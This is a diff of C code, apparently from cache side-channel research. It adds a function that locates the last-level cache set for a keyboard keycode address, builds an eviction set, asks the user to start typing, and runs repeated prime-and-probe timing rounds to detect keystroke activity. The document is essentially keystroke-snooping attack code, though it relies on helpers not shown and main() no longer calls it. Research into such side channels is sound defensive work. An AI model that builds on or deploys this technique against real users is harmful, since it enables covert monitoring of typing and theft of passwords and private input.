@@ -187,24 +187,48 @@ void test_find_all_eviction_sets(int set) {
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
 }
 
-int main() {
-  // test_eviction_set();
-  // test_covert_channel();
-  // test_eviction_and_pp();
+void measure_access(void) {
   mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
   if (mapping_start == MAP_FAILED) {
     perror("map");
-    return 0;
+    return;
   }
+  printf("mmap: %p\n", (void *)mapping_start);
 
   volatile uint8_t data = *(volatile uint8_t *)(mapping_start);
   int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
   int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
   printf("set: %d, slice: %d\n", set, slice);
-  CacheLineSet **cl_set;
+  CacheLineSet *cl_set = new_cl_set();
   get_eviction_set_from_slices(KBD_KEYCODE_ADDR, EVERGLADES_ASSOCIATIVITY,
-                               &mapping_start, cl_set);
-  print_cl_set(*cl_set);
+                               &mapping_start, &cl_set);
+  EvictionSet *es = new_eviction_set(cl_set);
+  NumList *nl = new_num_list(16);
+
+  printf("please start typing\n");
+
+  unsigned int core_id = 0;
+  sleep(5);
+  for (int i = 0; i < 100; i++) {
+    access_set(es);
+    uint64_t start = __rdtscp(&core_id);
+    while (__rdtscp(&core_id) - start < 10000)
+      ;
+    probe(es, nl);
+    print_num_list(nl);
+    clear_num_list(nl);
+  }
+  deep_free_es(es);
+  free_num_list(nl);
+
+  // deep_free_cl_set(cl_set);
+  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
+}
+
+int main() {
+  // test_eviction_set();
+  // test_covert_channel();
+  // test_eviction_and_pp();
   // test_find_all_eviction_sets(set);
 }
